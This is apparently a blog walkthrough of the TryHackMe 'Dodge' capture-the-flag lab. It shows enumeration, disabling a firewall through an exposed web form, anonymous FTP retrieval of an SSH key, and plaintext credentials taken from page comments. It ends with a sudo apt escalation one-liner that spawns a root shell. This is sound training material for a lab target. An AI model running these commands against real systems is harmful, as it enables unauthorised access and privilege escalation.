---
title: 'TryHackMe: Dodge'
author: jaxafed
categories: [TryHackMe]
tags: [web, vhost, subdomain, ufw, firewall, ftp, sudo, apt]
render_with_liquid: false
media_subpath: /images/tryhackme_dodge/
image:
  path: room_image.webp
---

Dodge started by inspecting the certificate of a https webserver to get a list of subdomains and enumerating these subdomains to find a PHP endpoint that allowed disabling the UFW firewall. After disabling the firewall, it was possible to access a FTP server and get a SSH key for a user, which allowed us to get a shell on the machine. After this, using port forwarding to access an internal website and logging in with the credentials found in the comments of the same website gave us credentials for another user. With this new user, we were able to abuse sudo privileges and get a shell as root.

![Tryhackme Room Link](room_card.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/dodge>_

## Initial enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.64.72
Nmap scan report for 10.10.64.72
Host is up (0.085s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 12:22:46:5a:8c:3a:53:16:60:78:3e:79:e1:66:ba:7d (RSA)
|   256 af:3a:3b:76:01:69:67:42:4a:53:ee:48:60:7c:6e:15 (ECDSA)
|_  256 36:87:fb:1f:3f:3c:30:cc:b5:61:23:9d:db:01:13:d9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.41
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dodge.thm/organizationName=Dodge Company, Inc./stateOrProvinceName=Tokyo/countryName=JP
| Subject Alternative Name: DNS:dodge.thm, DNS:www.dodge.thm, DNS:blog.dodge.thm, DNS:dev.dodge.thm, DNS:touch-me-not.dodge.thm, DNS:netops-dev.dodge.thm, DNS:ball.dodge.thm
| Not valid before: 2023-06-29T11:46:51
|_Not valid after:  2123-06-05T11:46:51
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Hosts: default, ip-10-10-64-72.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
With a nmap scan, there are three ports open:
- 22/SSH
- 80/HTTP
- 443/HTTPS

### Getting a List of Subdomains

`Nmap` already gave a list of subdomains, but it is also possible to get them manually by visiting the https server with `Firefox` and viewing the certificate.

![Subdomains](subdomains.webp){: width="400" height="300" }

Adding them to `/etc/hosts`
```
10.10.64.72 dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm
```
{: file="/etc/hosts" }

### Enumerating the Subdomains

Since most subdomains seem to return 403 Forbidden, we can use `ffuf` to quickly filter out those.

Creating a wordlist with all subdomains.

```
10.10.64.72
dodge.thm
www.dodge.thm
blog.dodge.thm
dev.dodge.thm
touch-me-not.dodge.thm
netops-dev.dodge.thm
ball.dodge.thm
```
{: file="subdomains.txt"}

Running `ffuf` with the created wordlist and filtering out responses with 403 status code.
```console
$ ffuf -u 'PROTO://10.10.64.72/' -H "Host: HOST" -w <(echo -e "http\nhttps"):PROTO -w subdomains.txt:HOST -fc 403
...
[Status: 200, Size: 7111, Words: 2327, Lines: 251, Duration: 88ms]
    * HOST: www.dodge.thm
    * PROTO: https

[Status: 200, Size: 743, Words: 68, Lines: 37, Duration: 102ms]
    * PROTO: https
    * HOST: netops-dev.dodge.thm

[Status: 200, Size: 82202, Words: 3981, Lines: 977, Duration: 95ms]
    * PROTO: https
    * HOST: dev.dodge.thm
```

- `https://www.dodge.thm/` looks like a static bootstrap site.

- `https://dev.dodge.thm/` gives the output of phpinfo.

- `https://netops-dev.dodge.thm/` looks empty, but checking the source code, it includes two javascript files.

```html
<script src='cf.js'></script>
<script  src="firewall.js"></script>
```

Checking `/firewall.js`, it makes a request to `/firewall10110.php`.

```js
fetch('firewall10110.php', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
})
```

Visiting `https://netops-dev.dodge.thm/firewall10110.php` returns what looks like the output of `ufw status verbose`.

```
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), deny (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
80                         ALLOW IN    Anywhere                  
443                        ALLOW IN    Anywhere                  
22                         ALLOW IN    Anywhere                  
21                         DENY IN     Anywhere                  
21/tcp                     DENY IN     Anywhere                  
80 (v6)                    ALLOW IN    Anywhere (v6)             
443 (v6)                   ALLOW IN    Anywhere (v6)             
22 (v6)                    ALLOW IN    Anywhere (v6)             
21 (v6)                    DENY IN     Anywhere (v6)             
21/tcp (v6)                DENY IN     Anywhere (v6)             
```
While allowing incoming connections to ports 22, 80, and 443, it denies any incoming connections to port 21.

## Foothold

### Disabling UFW

`https://netops-dev.dodge.thm/firewall10110.php` also has a form for submitting UFW commands.

After trying some command injection payloads and getting `Invalid command` for all, I decided to run normal UFW commands with the format specified in the placeholder: `sudo command parameter`

Upon sending `sudo ufw disable`, the server returns: `Firewall stopped and disabled on system startup`

![Disabling UFW](disabling_ufw.webp){: width="600" height="600" }

Refresing the page, it now displays: `Status: inactive`

![Disabled UFW](disabled_ufw.webp){: width="600" height="600" }

### Accessing FTP

Before, the firewall was denying incoming connections to port 21, but that should not be a problem now.

Checking port 21, it is not only open but also allows `anonymous` logins.

```console
$ ftp dodge.thm 
Connected to dodge.thm.
220 Welcome to Dodge FTP service
Name (dodge.thm:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
Looking at the files, it seems to be a home directory for a user.
```console
ftp> dir -a
229 Entering Extended Passive Mode (|||22979|)
150 Here comes the directory listing.
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 .
drwxr-xr-x    5 1003     1003         4096 Jun 29  2023 ..
-rwxr-xr-x    1 1003     1003           87 Jun 29  2023 .bash_history
-rwxr-xr-x    1 1003     1003          220 Feb 25  2020 .bash_logout
-rwxr-xr-x    1 1003     1003         3771 Feb 25  2020 .bashrc
drwxr-xr-x    2 1003     1003         4096 Jun 19  2023 .cache
drwxr-xr-x    3 1003     1003         4096 Jun 19  2023 .local
-rwxr-xr-x    1 1003     1003          807 Feb 25  2020 .profile
drwxr-xr-x    2 1003     1003         4096 Jun 22  2023 .ssh
-r--------    1 1003     1003           38 Jun 19  2023 user.txt
226 Directory send OK.
```
Checking the `.ssh` directory.

```console
ftp> cd .ssh
250 Directory successfully changed.
ftp> dir 
229 Entering Extended Passive Mode (|||62353|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1003     1003          573 Jun 22  2023 authorized_keys
-r--------    1 1003     1003         2610 Jun 22  2023 id_rsa
-rwxr-xr-x    1 1003     1003         2610 Jun 22  2023 id_rsa_backup
226 Directory send OK.
```

Downloading `id_rsa_backup` and `authorized_keys`.
```console
ftp> get id_rsa_backup
local: id_rsa_backup remote: id_rsa_backup
229 Entering Extended Passive Mode (|||9047|)
150 Opening BINARY mode data connection for id_rsa_backup (2610 bytes).
100% |**********************************************************************************|  2610        9.46 MiB/s    00:00 ETA
226 Transfer complete.
2610 bytes received in 00:00 (28.29 KiB/s)
ftp> get authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||54555|)
150 Opening BINARY mode data connection for authorized_keys (573 bytes).
100% |**********************************************************************************|   573      778.26 KiB/s    00:00 ETA
226 Transfer complete.
573 bytes received in 00:00 (6.09 KiB/s)
```

- `id_rsa_backup` looks like a ssh key.
- `authorized_keys` includes a username: `challenger`

### Shell as challenger

After setting the correct permissions for `id_rsa_backup`, it works for getting a shell as `challenger` using `ssh`.

```console
chmod 600 id_rsa_backup
ssh -i id_rsa_backup challenger@dodge.thm
```
```console
challenger@thm-lamp:~$ id
uid=1003(challenger) gid=1003(challenger) groups=1003(challenger)
```

With this, we can read the user flag.
```console
challenger@thm-lamp:~$ wc -c user.txt 
38 user.txt
```

## Shell as cobra

### Finding credentials for cobra

Looking for the source code of the websites present, there is one website called `notes`, that we have not encountered before.

```
challenger@thm-lamp:/var/www$ ls
default_html  html  html_www  notes  www
```
It seems to be running on `127.0.0.1:10000`.
```console
challenger@thm-lamp:/var/www$ cat /etc/apache2/sites-enabled/notes.conf
<VirtualHost 127.0.0.1:10000>
...
DocumentRoot /var/www/notes
...
```
```console
challenger@thm-lamp:/var/www$ ss -tln
State         Recv-Q        Send-Q                 Local Address:Port                  Peer Address:Port        Process        
LISTEN        0             511                        127.0.0.1:10000                      0.0.0.0:*                    
```

Forwarding the port using ssh.
```console
challenger@thm-lamp:/var/www$ ~C
ssh> -L 10000:127.0.0.1:10000
Forwarding port.
```

Viewing the source code of the `http://127.0.0.1:10000/public/html/login.php` page, it includes commented-out credentials that work for logging in.

```
<!-- <input type="text" id="username" name="username" class="form-control" value="gabriela"> -->
<!-- <input type="password" id="password" name="password" class="form-control" value="^5hf5w&CAt9sPr@"> -->
```

After logging in, there are credentials for user `cobra` at `http://127.0.0.1:10000/public/html/dashboard.php`.

![Cobra credentials](notes_site.webp){: width="1000" height="800" }

Using these credentials, we are not able to login as `cobra` using `ssh`, but we can switch to the user using `su` command from the ssh session we have as `challenger`.

```console
challenger@thm-lamp:~$ su cobra -
Password: 
cobra@thm-lamp:/home/challenger$ id
uid=1002(cobra) gid=1002(cobra) groups=1002(cobra)
```
### Alternative way to get credentials for cobra

Since user `challenger` is able to read files in `/var/www/notes`, instead of forwarding the port and accessing the website, it is possible to just read the `/var/www/notes/api/posts.php` and get the credentials by decoding the base64 blob inside.
```console
$ echo 'W3si...1In1d' | base64 -d | jq   
[
  {
    "title": "To-do list",
    "content": "Define app requirements:<br> 1. Design user interface. <br> 2. Set up development environment. <br> 3. Implement basic functionality."
  },
  {
    "title": "My SSH login",
    "content": "cobra / [REDACTED]"
  }
]
```

## Shell as root

### Sudo privilege

Checking the `sudo` privileges, user `cobra` is allowed to run `apt` as `root`.

```console
cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt
```

We can use the payload from [GTFOBins](https://gtfobins.github.io/gtfobins/apt/#sudo) to get a shell as root.

```console
cobra@thm-lamp:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

And read the root flag.

```console
# wc -c root.txt
38 root.txt
```